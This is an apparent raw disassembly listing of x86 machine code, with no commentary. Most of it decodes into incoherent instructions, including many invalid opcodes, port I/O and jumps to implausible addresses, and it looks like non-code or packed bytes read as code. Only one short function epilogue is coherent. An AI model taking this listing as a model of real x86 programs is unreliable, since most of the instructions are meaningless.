  420d05:	xchg   edx,eax
  420d06:	int    0x61
  420d08:	test   DWORD PTR [edx-0x7f],0x810edf01
  420d0f:	out    dx,al
  420d10:	or     dl,BYTE PTR [ebp+0x52]
  420d13:	inc    ebx
  420d14:	jg     0x3d767712
  420d1a:	jg     0x420d3a
  420d1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d1d:	pop    es
  420d1e:	adc    bh,bl
  420d20:	fwait
  420d21:	shl    bh,0x58
  420d24:	outs   dx,BYTE PTR ds:[esi]
  420d25:	pop    eax
  420d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d27:	pop    ebx
  420d28:	mov    ds:0xf9cb0495,al
  420d2d:	xor    al,0x3e
  420d2f:	adc    BYTE PTR ds:0xced0eb7e,0x84
  420d36:	pop    ebx
  420d37:	cmp    eax,0x8295e821
  420d3c:	jge    0x420d46
  420d3e:	inc    eax
  420d3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d40:	test   esi,ecx
  420d42:	xchg   edi,eax
  420d43:	adc    DWORD PTR [ebx],esp
  420d45:	ss mov esp,0x1a10a688
  420d4b:	scas   al,BYTE PTR es:[edi]
  420d4c:	retw   
  420d4e:	or     DWORD PTR [eax],eax
  420d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d51:	out    dx,al
  420d52:	push   cs
  420d53:	jg     0x420d41
  420d55:	push   edx
  420d56:	mov    al,0x4
  420d58:	fld    QWORD PTR [eax+0x51]
  420d5b:	mov    ah,0x15
  420d5d:	pop    esi
  420d5e:	jle    0x420db9
  420d60:	fmul   QWORD PTR [esi]
  420d62:	mov    eax,ds:0x8ddde0ec
  420d67:	test   DWORD PTR [esi-0x6a],esi
  420d6a:	dec    esi
  420d6b:	mov    esi,0x26124cdc
  420d70:	xor    eax,ebx
  420d72:	sbb    esi,DWORD PTR [edi-0x61]
  420d75:	call   0x29031977
  420d7a:	pop    ds
  420d7b:	jo     0x420dab
  420d7d:	xor    al,0x92
  420d7f:	cmp    eax,0xabb851ee
  420d84:	dec    eax
  420d85:	adc    bl,BYTE PTR [ebx-0x3d52f1b]
  420d8b:	stc    
  420d8c:	lahf   
  420d8d:	mov    dl,0x42
  420d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d90:	or     al,0x2b
  420d92:	push   edi
  420d93:	(bad)  [edi-0x30]
  420d96:	fbstp  TBYTE PTR [edi]
  420d98:	and    esp,DWORD PTR [esp+ebp*8-0x21291f67]
  420d9f:	std    
  420da0:	sbb    dl,BYTE PTR [ebx]
  420da2:	ss jge 0x420e0d
  420da5:	fisubr DWORD PTR [ebx+edx*1-0x3b]
  420da9:	dec    eax
  420daa:	das    
  420dab:	mov    cl,0x25
  420dad:	xor    al,0x4d
  420daf:	push   eax
  420db0:	xor    al,0x37
  420db2:	adc    BYTE PTR [ebx],cl
  420db4:	shl    BYTE PTR [esi],1
  420db6:	mov    edx,0x43de0cd0
  420dbb:	jne    0x420e26
  420dbd:	mov    ch,0xd7
  420dbf:	sub    eax,0x959a12a5
  420dc4:	jge    0x420d4b
  420dc6:	mov    edx,esp
  420dc8:	adc    ch,dl
  420dca:	push   esi
  420dcb:	xlat   BYTE PTR ds:[ebx]
  420dcc:	(bad)  
  420dcd:	loopne 0x420de5
  420dcf:	aad    0xa4
  420dd1:	and    ecx,DWORD PTR ds:0x2b3d1df6
  420dd7:	push   0x58efae69
  420ddc:	jo     0x420db0
  420dde:	in     al,dx
  420ddf:	xchg   edx,eax
  420de0:	push   edi
  420de1:	mov    ebp,0xbb39c98f
  420de6:	cmp    eax,0xd351a4ab
  420deb:	add    eax,esi
  420ded:	cmp    esi,DWORD PTR [ecx]
  420def:	jo     0x420e2c
  420df1:	or     DWORD PTR [edi-0x35],eax
  420df4:	cmc    
  420df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420df6:	adc    edi,DWORD PTR [ebx]
  420df8:	mov    DWORD PTR [esi+0x3e],edi
  420dfb:	cmp    bl,dl
  420dfd:	stos   BYTE PTR es:[edi],al
  420dfe:	imul   eax,DWORD PTR [ebx],0xffffffc5
  420e01:	shr    BYTE PTR [esi-0x50548862],1
  420e07:	xor    al,ah
  420e09:	xor    eax,0xcda4db7d
  420e0e:	call   FWORD PTR [di]
  420e11:	aad    0x33
  420e13:	fdiv   QWORD PTR [edx-0x5444489e]
  420e19:	(bad)
  420e1e:	js     0x420de5
  420e20:	push   ecx
  420e21:	pop    eax
  420e22:	popa   
  420e23:	jmp    0xbd0daa11
  420e28:	(bad)  
  420e29:	aam    0x87
  420e2b:	xchg   DWORD PTR [ecx-0x6de80b01],edi
  420e31:	das    
  420e32:	push   0x74f657d8
  420e37:	push   0xffffffb4
  420e39:	outs   dx,BYTE PTR ds:[esi]
  420e3a:	dec    BYTE PTR [esi]
  420e3c:	mov    ds:0x9742d72b,eax
  420e41:	xlat   BYTE PTR ds:[ebx]
  420e42:	gs mov eax,0xe31a68f6
  420e48:	scas   eax,DWORD PTR es:[edi]
  420e49:	sub    eax,0x73f17d98
  420e4e:	xchg   edi,eax
  420e4f:	xchg   ecx,eax
  420e50:	adc    eax,0xe4d8d401
  420e55:	and    dh,BYTE PTR [ebp+0xfca8d7f]
  420e5b:	or     al,0x6
  420e5d:	push   es
  420e5e:	dec    eax
  420e5f:	push   esp
  420e60:	les    edx,FWORD PTR [ecx+0x106cfda7]
  420e66:	fld    st(0)
  420e68:	xor    DWORD PTR [edx+0x3301a943],0x554c16bd
  420e72:	stos   DWORD PTR es:[edi],eax
  420e73:	inc    eax
  420e74:	(bad)  
  420e75:	fstp   DWORD PTR [ebp+0x6002785e]
  420e7b:	jge    0x420e81
  420e7d:	add    al,BYTE PTR [esp+esi*2-0x6ebc2af]
  420e84:	sbb    si,WORD PTR [edi]
  420e87:	jbe    0x420e70
  420e89:	cmp    ebx,DWORD PTR [esi+0x2f]
  420e8c:	add    BYTE PTR [esi+0x4],cl
  420e8f:	dec    ebx
  420e90:	pop    ebp
  420e91:	sbb    esp,DWORD PTR [esi+0x6a]
  420e94:	push   0xfffffff0
  420e96:	sub    DWORD PTR [ebx+eax*8-0x571cc516],edx
  420e9d:	xchg   ebp,eax
  420e9e:	icebp  
  420e9f:	mov    edx,0xdefff452
  420ea4:	gs pop esi
  420ea6:	ret    
  420ea7:	add    eax,0x80ba3f39
  420eac:	adc    al,0x34
  420eae:	push   ebx
  420eaf:	addr16 inc edx
  420eb1:	fnstcw WORD PTR [esi+0x18145106]
  420eb7:	gs xor eax,0x2088b0c8
  420ebd:	mov    cl,0x84
  420ebf:	int3   
  420ec0:	add    BYTE PTR [ebx+esi*1-0x5df25a56],0xeb
  420ec8:	xor    eax,0xb3b91f11
  420ecd:	or     BYTE PTR [edx-0x3b02315a],bh
  420ed3:	cli    
  420ed4:	outs   dx,BYTE PTR ds:[esi]
  420ed5:	dec    eax
  420ed6:	and    BYTE PTR [ecx],cl
  420ed8:	inc    esi
  420ed9:	call   0xf7adc60f
  420ede:	hlt    
  420edf:	pop    eax
  420ee0:	outs   dx,DWORD PTR ds:[esi]
  420ee1:	adc    eax,0x4ab367a3
  420ee6:	fmul   QWORD PTR ds:[edx]
  420ee9:	sub    BYTE PTR [edx-0x10830778],ch
  420eef:	pop    ds
  420ef0:	xchg   bh,al
  420ef2:	jmp    0xd08dbcad
  420ef7:	push   edx
  420ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ef9:	push   edi
  420efa:	les    ecx,FWORD PTR [edi]
  420efc:	sahf   
  420efd:	add    al,0xe4
  420eff:	fisub  DWORD PTR [esi]
  420f01:	ficomp DWORD PTR [eax]
  420f03:	and    BYTE PTR [eax-0x7],ch
  420f06:	ins    BYTE PTR es:[edi],dx
  420f07:	xlat   BYTE PTR ds:[ebx]
  420f08:	popa   
  420f09:	fld    TBYTE PTR gs:[edi-0x49]
  420f0d:	clc    
  420f0e:	jno    0x420f21
  420f10:	jns    0x420f1a
  420f12:	and    DWORD PTR ds:0xcd609e6e,0xfffffff7
  420f19:	jnp    0x420eab
  420f1b:	(bad)  
  420f1c:	mov    ah,0x2e
  420f1e:	aad    0xc1
  420f20:	cmp    ecx,edx
  420f22:	dec    eax
  420f23:	push   ecx
  420f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f25:	scas   eax,DWORD PTR es:[edi]
  420f26:	add    dl,ch
  420f28:	das    
  420f29:	ror    edi,cl
  420f2b:	mov    ebx,fs
  420f2d:	xchg   BYTE PTR [ecx],bh
  420f2f:	mov    esp,0x4b2675bd
  420f34:	pop    ebp
  420f35:	push   DWORD PTR [edi]
  420f37:	and    al,0xea
  420f39:	cdq    
  420f3a:	push   edx
  420f3b:	or     DWORD PTR [ebx+0x1a9aeca0],eax
  420f41:	and    esp,DWORD PTR [esi-0x6b2832f8]
  420f47:	push   cs
  420f48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f49:	or     ecx,DWORD PTR [ecx+eiz*2+0x5e7bf6a6]
  420f50:	add    bl,0xe7
  420f53:	xor    DWORD PTR [ecx+0x7a539850],edx
  420f59:	test   eax,0x68c48a20
  420f5e:	dec    edx
  420f5f:	xchg   edx,eax
  420f60:	jb     0x420f18
  420f62:	fs retf 0x3e7a
  420f66:	enter  0x3820,0xc5
  420f6a:	mov    dl,BYTE PTR [ebx+ebx*2-0x7320632f]
  420f71:	repnz call 0xa5cc:0x9d1eac1e
  420f79:	push   edx
  420f7a:	and    BYTE PTR [ebx+0x15c5fcb9],dh
  420f80:	repnz push es
  420f82:	sub    DWORD PTR [ebx],edx
  420f84:	jo     0x420fc7
  420f86:	xchg   esp,eax
  420f87:	and    ebx,ecx
  420f89:	mov    bh,0x1c
  420f8b:	pushf  
  420f8c:	out    0xd3,eax
  420f8e:	sar    ebp,1
  420f90:	loope  0x420fb9
  420f92:	jp     0x420ffa
  420f94:	cmp    al,BYTE PTR [edx]
  420f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f97:	test   eax,0x556dc319
  420f9c:	sub    BYTE PTR ss:[esp+eax*2+0x4e7ad417],dl
  420fa4:	mov    ch,0x28
  420fa6:	cs jbe 0x420fc3
  420fa9:	leave  
  420faa:	jbe    0x420ff6
  420fac:	call   0xaf44:0xd4fc6669
  420fb3:	mov    ebx,0x57258492
  420fb8:	jo     0x421013
  420fba:	fsub   QWORD PTR [edx]
  420fbc:	jl     0x420f46
  420fbe:	pusha  
  420fbf:	or     eax,0x1a3dfce2
  420fc4:	xchg   BYTE PTR [ebx-0x9],dh
  420fc7:	jp     0x421042
  420fc9:	or     ch,al
  420fcb:	repz push edx
  420fcd:	xchg   edi,eax
  420fce:	rcr    esp,cl
  420fd0:	sub    DWORD PTR [eax-0x43],ebp
  420fd3:	nop
  420fd4:	sbb    esi,DWORD PTR [ebp-0x61]
  420fd7:	cdq    
  420fd8:	xchg   BYTE PTR [edi-0x4e4e53f],cl
  420fde:	jp     0x420f8a
  420fe0:	arpl   WORD PTR [esi+0x69],bp
  420fe3:	adc    eax,0xdf00fd20
  420fe8:	xchg   DWORD PTR [ebp+0x66],eax
  420feb:	jbe    0x421009
  420fed:	jge    0x420ffa
  420fef:	rcl    BYTE PTR [edi+0x63c15358],cl
  420ff5:	mov    ecx,0xe4bfe8b7
  420ffa:	cmp    ah,BYTE PTR [bp+si]
  420ffd:	cli    
  420ffe:	pop    edi
  420fff:	je     0x42101c
  421001:	pushf  
  421002:	std    
  421003:	call   0x619c:0x9ff24580
  42100a:	dec    ebx
  42100b:	mov    esp,0xb9af867f
  421010:	fld    TBYTE PTR [edx+0xc]
  421013:	jno    0x420fed
  421015:	jecxz  0x421030
  421017:	jle    0x420fd7
  421019:	inc    ebp
  42101a:	ss ret 
  42101c:	push   ebx
  42101d:	push   es
  42101e:	ds into 
  421020:	xchg   edi,eax
  421021:	hlt    
  421022:	add    DWORD PTR [ecx],edx
  421024:	cmp    BYTE PTR [ecx],0x7f
  421027:	xchg   esp,eax
  421028:	mov    cl,dl
  42102a:	int    0x56
  42102c:	adc    al,BYTE PTR [ebp-0x3d445b38]
  421032:	xor    ecx,DWORD PTR [edi+eiz*1]
  421035:	or     ah,BYTE PTR [esi]
  421037:	dec    esp
  421038:	das    
  421039:	enter  0x59d4,0x1
  42103d:	scas   al,BYTE PTR es:[edi]
  42103e:	push   es
  42103f:	loope  0x42105f
  421041:	and    eax,0x2d80b23a
  421046:	aas    
  421047:	pop    es
  421048:	jle    0x420fe8
  42104a:	push   es
  42104b:	sar    DWORD PTR [ebp+0x50a92fec],1
  421051:	xchg   DWORD PTR [edx],esi
  421053:	mov    ah,ch
  421055:	test   BYTE PTR [ebp-0x7e],bh
  421058:	sbb    ch,BYTE PTR [eax+ecx*1+0x39dab07f]
  42105f:	retf   0x62e0
  421062:	pop    ebp
  421063:	ret    0xf96b
  421066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421067:	cs adc eax,0xa11b54d8
  42106d:	push   ecx
  42106e:	mov    ds:0x91ca57,eax
  421073:	xchg   esi,eax
  421074:	stc    
  421075:	in     eax,dx
  421076:	mov    bl,0xd8
  421078:	in     eax,0x14
  42107a:	cli    
  42107b:	fucom  st(0)
  42107d:	sub    BYTE PTR [ebx-0x46115afc],bl
  421083:	push   DWORD PTR [ebp+ebp*1+0x29]
  421087:	sub    al,0xd9
  421089:	test   DWORD PTR [ebx+0x52],edx
  42108c:	xchg   esp,eax
  42108d:	adc    eax,0xdccb2da5
  421092:	adc    ecx,edx
  421094:	push   0xb3afad82
  421099:	mov    ebp,0xf8d84f40
  42109e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42109f:	inc    DWORD PTR [edx+0x10d6a3ea]
  4210a5:	lods   eax,DWORD PTR ds:[esi]
  4210a6:	cmc    
  4210a7:	mov    dl,0x8e
  4210a9:	bound  ebx,QWORD PTR [edi+0x5e]
  4210ac:	mov    edi,0xa508688b
  4210b1:	xchg   DWORD PTR [ecx+0x6d],ebp
  4210b4:	mov    edi,0xc73fb9c1
  4210b9:	mov    dh,0x2c
  4210bb:	sub    al,0x49
  4210bd:	adc    al,0x3
  4210bf:	and    BYTE PTR [ebp+0x11252d60],al
  4210c5:	js     0x42113c
  4210c7:	mov    ds:0x62f800a8,eax
  4210cc:	lods   eax,DWORD PTR ds:[esi]
  4210cd:	push   edx
  4210ce:	jg     0x42109e
  4210d0:	into   
  4210d1:	ds add al,0xf
  4210d4:	loop   0x421115
  4210d6:	xlat   BYTE PTR ds:[ebx]
  4210d7:	call   FWORD PTR [edi-0x26]
  4210da:	pushf  
  4210db:	push   es
  4210dc:	mov    eax,DWORD PTR [ebx]
  4210de:	nop
  4210df:	sbb    DWORD PTR [edx],edi
  4210e1:	test   BYTE PTR [edx+0x41c44df9],dh
  4210e7:	adc    eax,0x9165b646
  4210ec:	pusha  
  4210ed:	in     al,dx
  4210ee:	in     eax,0xc8
  4210f0:	aas    
  4210f1:	out    0xc8,al
  4210f3:	aam    0x7a
  4210f5:	dec    ecx
  4210f6:	call   0x2e896126
  4210fb:	nop
  4210fc:	mov    ah,0xd
  4210fe:	sub    al,0x47
  421100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421101:	fisttp WORD PTR [esi+0x4b]
  421104:	or     al,0xf9
  421106:	fistp  QWORD PTR [ebp+0x39]
  421109:	jne    0x4210ee
  42110b:	ror    BYTE PTR [eax-0x62],0x89
  42110f:	and    ah,dh
  421111:	ret    
  421112:	retf   
  421113:	mov    ecx,0x1805bb4f
  421118:	sub    DWORD PTR [ecx-0x4e],esi
  42111b:	(bad)  
  42111c:	out    0x7d,eax
  42111e:	jmp    0x4210c5
  421120:	pop    ebp
  421121:	cmp    bh,ah
  421123:	sbb    ah,al
  421125:	cmp    BYTE PTR [ebx],0xfb
  421128:	xor    bl,dh
  42112a:	mov    ch,0x21
  42112c:	(bad)  
  42112d:	xchg   ecx,eax
  42112e:	add    al,0x30
  421130:	push   ecx
  421131:	iret   
  421132:	or     esp,DWORD PTR [ecx-0x75]
  421135:	cmp    DWORD PTR [ebx],eax
  421137:	xlat   BYTE PTR ds:[ebx]
  421138:	mov    DWORD PTR [ecx],edx
  42113a:	mov    ecx,DWORD PTR [ebp+0x8]
  42113d:	xor    ecx,eax
  42113f:	add    ecx,esi
  421141:	jne    0x41ed92
  421147:	mov    ecx,DWORD PTR [ebp-0x8]
  42114a:	xor    ecx,eax
  42114c:	mov    eax,DWORD PTR [ebp+0x10]
  42114f:	add    ecx,esi
  421151:	mov    DWORD PTR [eax],ecx
  421153:	pop    edi
  421154:	pop    esi
  421155:	pop    ebx
  421156:	leave  
  421157:	ret    0xc
  42115a:	pop    ss
  42115b:	or     al,0x84
  42115d:	repz lahf 
  42115f:	sti    
  421160:	ja     0x42114e
  421162:	stos   BYTE PTR es:[edi],al
  421163:	mov    edx,0x97a488e2
  421168:	pop    ss
  421169:	adc    edi,DWORD PTR ds:0x5a0001cc
  42116f:	add    BYTE PTR [eax],al
  421171:	add    dh,ch
  421173:	xchg   edx,eax
  421174:	call   0xa27274a9
  421179:	mov    ds:0xb0ca4999,al
  42117e:	das    
  42117f:	push   edx
  421180:	enter  0x9548,0x61
  421184:	or     al,0x8
  421186:	in     eax,0x1e
  421188:	dec    ecx
  421189:	jl     0x42117b
  42118b:	push   0x41
  42118d:	loope  0x4211bc
  42118f:	daa    
  421190:	out    0x88,al
  421192:	and    ebx,DWORD PTR [eax-0x36]
  421195:	mov    bh,0x6a
  421197:	out    dx,al
  421198:	jp     0x42117c
  42119a:	sub    al,0x25
  42119c:	push   0xbd1d1e41
  4211a1:	mov    ebp,0x320083e3
  4211a6:	fldcw  WORD PTR [eax-0x6782aeb1]
  4211ac:	inc    ecx
  4211ad:	inc    ecx
  4211ae:	out    0x59,eax
  4211b0:	cdq    
  4211b1:	mov    DWORD PTR [ebx],eax
  4211b3:	jecxz  0x42122a
  4211b5:	loopne 0x421218
  4211b7:	gs pop edx
  4211b9:	iret   
  4211ba:	sar    BYTE PTR [ebx-0x4858329a],cl
  4211c0:	retf   0x9cbc
  4211c3:	retf   0x588d
  4211c6:	cmc    
  4211c7:	pop    edx
  4211c8:	or     al,0x58
  4211ca:	or     BYTE PTR [ecx+0x0],bh
	...
  4211d9:	add    cl,dl
  4211db:	sub    al,0x14
  4211dd:	adc    edi,ebp
  4211df:	cmp    edx,edi
  4211e1:	out    dx,al
  4211e2:	pop    edi
  4211e3:	xchg   bx,ax
  4211e5:	push   0xb4892b6b
  4211ea:	xchg   edi,eax
  4211eb:	int3   
  4211ec:	add    DWORD PTR [eax],eax
  4211ee:	pop    edx
  4211ef:	add    BYTE PTR [eax],al
  4211f1:	add    BYTE PTR [ebp+0x3e],dh
  4211f4:	imul   ecx,DWORD PTR [edi+edi*4+0x54],0x9566a94e
  4211fc:	stc    
  4211fd:	sbb    ah,BYTE PTR [edi+ebx*4+0x71]
  421201:	idiv   BYTE PTR [eax-0x664ebf03]
  421207:	push   edi
  421208:	adc    dh,BYTE PTR [ebx-0x29]
  42120b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42120c:	adc    eax,0xca21d4ab
  421211:	ins    DWORD PTR es:[edi],dx
  421212:	fld    QWORD PTR [ebx+edx*4+0x7c]
  421216:	(bad)  
  421217:	out    dx,al
  421218:	mov    edx,0xc629ba4f
  42121d:	das    
  42121e:	pop    edi
  42121f:	sbb    DWORD PTR [ebp*4+0x3b59ab0],ebx
  421226:	aad    0x74
  421228:	jg     0x42127b
  42122a:	mov    esi,0x6c0538f0
  42122f:	add    dl,al
  421231:	ss hlt 
  421233:	cmc    
  421234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421235:	pop    ds
  421236:	mov    ds:0x90066293,al
  42123b:	fistp  DWORD PTR [edi]
  42123d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42123e:	xchg   DWORD PTR [ebx],esp
  421240:	mov    bl,0xc3
  421242:	sahf   
  421243:	mov    dh,0xb9
  421246:	cli    
  421247:	inc    ebp
  421248:	jno    0x4211d6
  42124a:	repz jmp 0x0:0x0
	...
  42125a:	pop    ds
  42125b:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421261:	sub    eax,esi
  421263:	add    BYTE PTR [edi+eax*2-0x5179d77f],0xf1
  42126b:	int3   
  42126c:	add    DWORD PTR [eax],eax
  42126e:	pop    edx
  42126f:	add    BYTE PTR [eax],al
  421271:	add    BYTE PTR [edi],dh
  421273:	lds    edi,FWORD PTR [esi-0x72cb1e5d]
  421279:	xor    edx,DWORD PTR [ecx-0x19]
  42127c:	xor    DWORD PTR [ebx-0x255872aa],ebp
  421282:	adc    BYTE PTR [ebp+ebp*1+0x7b91cf9c],dl
  421289:	pop    ss
  42128a:	ins    DWORD PTR es:[edi],dx
  42128b:	cld    
  42128c:	inc    esi
  42128d:	sbb    eax,0xbb0591d
  421292:	and    ebx,esp
  421294:	int3   
  421295:	sub    BYTE PTR [esi-0x29da5041],0x62
  42129c:	shl    DWORD PTR [esi-0x7492cdd5],1
  4212a2:	cs mov esp,0x99f7e9fc
  4212a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212a9:	jp     0x42127b
  4212ab:	adc    al,0x72
  4212ad:	mov    al,0x6d
  4212af:	fistp  QWORD PTR [edx+eiz*2-0x6b]
  4212b3:	sub    BYTE PTR [esi-0x34],al
  4212b6:	dec    esi
  4212b7:	enter  0xebfb,0xf8
  4212bb:	sti    
  4212bc:	push   esp
  4212bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212be:	cdq    
  4212bf:	jae    0x421320
  4212c1:	scas   eax,DWORD PTR es:[edi]
  4212c2:	mov    ds:0x899b9923,al
  4212c7:	ret    0x7bdf
  4212ca:	add    cl,ah
	...
  4212d8:	add    BYTE PTR [eax],al
  4212da:	das    
  4212db:	and    al,0xf0
  4212dd:	aam    0xfb
  4212df:	aam    0x2f
  4212e1:	jmp    FWORD PTR [esi+0x33]
  4212e4:	je     0x42129c
  4212e6:	leave  
  4212e7:	add    ecx,DWORD PTR [edx-0x6c]
  4212ea:	dec    ebx
  4212eb:	int    0x1
  4212ed:	add    BYTE PTR [edx+0x0],bl
  4212f0:	add    BYTE PTR [eax],al
  4212f2:	push   ds
  4212f3:	sub    BYTE PTR [esi+0x7e],ah
  4212f6:	fadd   DWORD PTR [edx-0x32]
  4212f9:	(bad)  
  4212fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212fb:	enter  0xc0bf,0xa
  4212ff:	mov    ebp,ecx
  421301:	fisub  WORD PTR [esi+0x12]
  421304:	mov    ecx,0xa49befc7
  421309:	xor    edi,DWORD PTR [edx]
  42130b:	cwde   
  42130c:	dec    ecx
  42130d:	mov    ebp,0x32ae8805
  421312:	sub    al,0x37
  421314:	sub    al,0xcf
  421316:	xchg   edi,eax
  421317:	mov    ah,0x5d
  421319:	outs   dx,DWORD PTR ds:[esi]
  42131a:	retf   
  42131b:	mov    edx,0x1e1472f2
  421320:	sar    BYTE PTR [ebx],0x6a
  421323:	xchg   edi,eax
  421324:	cmc    
  421325:	inc    ecx
  421326:	bound  ecx,QWORD PTR [esi+0x75]
  421329:	xor    eax,0x40c3abe3
  42132e:	inc    ebp
  42132f:	lahf   
  421330:	xchg   edi,eax
  421331:	lods   eax,DWORD PTR ds:[esi]
  421332:	xchg   edx,eax
  421333:	mov    ecx,0xaa4378dc
  421338:	inc    eax
  421339:	fsubr  DWORD PTR [edx-0x3]
  42133c:	outs   dx,BYTE PTR ds:[esi]
  42133d:	idiv   DWORD PTR [ebx-0x62]
  421340:	pop    esp
  421341:	dec    ecx
  421342:	inc    esi
  421343:	scas   eax,DWORD PTR es:[edi]
  421344:	test   BYTE PTR [edx],dh
  421346:	mov    esi,0x5c3d38b8
  42134b:	cmp    eax,DWORD PTR [eax]
	...
  421359:	add    dl,cl
  42135b:	mov    al,ds:0xdf7e4d76
  421360:	sti    
  421361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421362:	mov    bh,0x83
  421364:	dec    edi
  421365:	mov    ds:0xea7f47d4,al
  42136a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42136b:	int    0x1
  42136d:	add    BYTE PTR [edx+0x0],bl
  421370:	add    BYTE PTR [eax],al
  421372:	sub    DWORD PTR [edi],ecx
  421374:	dec    ecx
  421375:	aad    0x4f
  421377:	mov    dh,0xc9
  421379:	popa   
  42137a:	mov    al,0x86
  42137c:	lods   al,BYTE PTR ds:[esi]
  42137d:	push   0x5a
  42137f:	push   ecx
  421380:	int    0xd
  421382:	xor    eax,0x304ff1
  421387:	jno    0x421401
  421389:	mov    eax,ds:0x1c083ca8
  42138e:	jmp    0xc102:0x8fb9d629
  421395:	push   edi
  421396:	jb     0x42136f
  421398:	pop    edi
  421399:	sbb    ebx,DWORD PTR [edi]
  42139b:	shl    al,cl
  42139d:	fmul   QWORD PTR [edi-0x56]
  4213a0:	fwait
  4213a1:	cmp    BYTE PTR [edi+0x3b],0xd
  4213a5:	(bad)  
  4213a6:	ror    BYTE PTR [edi+0x3e],cl
  4213a9:	rcr    BYTE PTR [edi],1
  4213ab:	xlat   BYTE PTR ds:[ebx]
  4213ac:	adc    esp,ebp
  4213ae:	dec    ecx
  4213af:	pop    edx
  4213b0:	sti    
  4213b1:	jns    0x421350
  4213b3:	push   cs
  4213b4:	ins    DWORD PTR es:[edi],dx
  4213b5:	imul   ebp,ebx,0xa66f0841
  4213bb:	mov    cl,BYTE PTR [edx]
  4213bd:	pop    ss
  4213be:	shl    ecx,1
  4213c0:	pop    ss
  4213c1:	lds    eax,FWORD PTR [ebp-0x130e8489]
  4213c7:	test   DWORD PTR [eax+0x55],ebp
  4213ca:	mov    ecx,0x88
	...
  4213d7:	add    BYTE PTR [eax],al
  4213d9:	add    dh,al
  4213db:	out    dx,al
  4213dc:	lods   al,BYTE PTR ds:[esi]
  4213dd:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4213e4:	stc    
  4213e5:	stc    
  4213e6:	xchg   BYTE PTR [edx-0x32004566],cl
  4213ec:	add    DWORD PTR [eax],eax
  4213ee:	pop    edx
  4213ef:	add    BYTE PTR [eax],al
  4213f1:	add    BYTE PTR [eax-0x17],ch
  4213f4:	retf   
  4213f5:	cmp    BYTE PTR [esi-0x7d],cl
  4213f8:	xchg   ecx,eax
  4213f9:	cld    
  4213fa:	mov    bl,0x22
  4213fc:	repz mov esi,0x2ac24486
  421402:	hlt    
  421403:	in     eax,dx
  421404:	fisub  WORD PTR [esi-0x1b9c2fe6]
  42140a:	out    dx,eax
  42140b:	(bad)  
  42140c:	in     eax,dx
  42140d:	jle    0x42140c
  42140f:	out    dx,eax
  421410:	mov    ebx,DWORD PTR es:[ecx+ecx*4-0x3474c048]
  421418:	cmp    eax,DWORD PTR [ecx+edx*1]
  42141b:	mov    esp,0x2b3ee1ee
  421420:	inc    esi
  421421:	stos   DWORD PTR es:[edi],eax
  421422:	pop    edi
  421423:	aad    0xd4
  421425:	pusha  
  421426:	ds pop esp
  421428:	rol    BYTE PTR [edi+0x47c357a7],0x9c
  42142f:	mov    ecx,0x9b399ce8
  421434:	cmp    BYTE PTR [ebx+esi*2-0x67],bl
  421438:	shl    BYTE PTR ds:0xbfdf4eb,cl
  42143e:	xchg   ebp,eax
  42143f:	dec    esi
  421440:	enter  0xae43,0xd
  421444:	ret    
  421445:	call   0x42d2:0x57d57ff5
	...
  421458:	add    BYTE PTR [eax],al
  42145a:	push   edx
  42145b:	xor    al,0x40
  42145d:	gs data16 jne 0x4214d8
  421461:	aaa    
  421462:	push   0x8c6a4e09
  421467:	neg    BYTE PTR [esi-0x2]
  42146a:	pop    ecx
  42146b:	into   
  42146c:	add    DWORD PTR [eax],eax
  42146e:	pop    edx
  42146f:	add    BYTE PTR [eax],al
  421471:	add    BYTE PTR [ebp-0x23],dh
  421474:	xchg   ebp,eax
  421475:	cdq    
  421476:	inc    edi
  421477:	push   0x3d3b209e
  42147c:	and    ah,BYTE PTR [eax]
  42147e:	sub    esp,ebx
  421480:	call   0xf0bdc029
  421485:	cmc    
  421486:	aam    0x33
  421488:	xchg   DWORD PTR [eax+ecx*1],edx
  42148b:	aaa    
  42148c:	push   ds
  42148d:	sbb    DWORD PTR [edx-0x72],esi
  421490:	je     0x4214e2
  421492:	mov    esi,0x41a56676
  421497:	mov    al,0x67
  421499:	pop    edx
  42149a:	in     al,dx
  42149b:	adc    al,0x2b
  42149d:	jmp    0x7bc782d6
  4214a2:	(bad)  
  4214a3:	mov    esp,0xa1ab05cf
  4214a8:	iret   
  4214a9:	jae    0x4214ff
  4214ab:	and    esi,DWORD PTR ds:0xad77fca2
  4214b1:	mov    ah,0xf
  4214b3:	ret    0xfe5a
  4214b6:	sbb    DWORD PTR [esp+eax*1],ecx
  4214b9:	std    
  4214ba:	inc    ebp
  4214bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214bc:	cs (bad) 
  4214c0:	ret    
  4214c1:	jecxz  0x42151e
  4214c3:	call   0xe8e0:0x471825fa
  4214ca:	dec    ebp
  4214cb:	sub    eax,DWORD PTR [eax]
	...
  4214d9:	add    BYTE PTR [ecx+0x46],cl
  4214dc:	sub    BYTE PTR [eax],dh
  4214de:	das    
  4214df:	jle    0x42153a
  4214e1:	jg     0x4214a9
  4214e3:	imul   esi,eax,0xffffffd5
  4214e6:	push   esp
  4214e7:	dec    edx
  4214e8:	adc    al,0x7a
  4214ea:	in     eax,dx
  4214eb:	fild   WORD PTR [ecx]
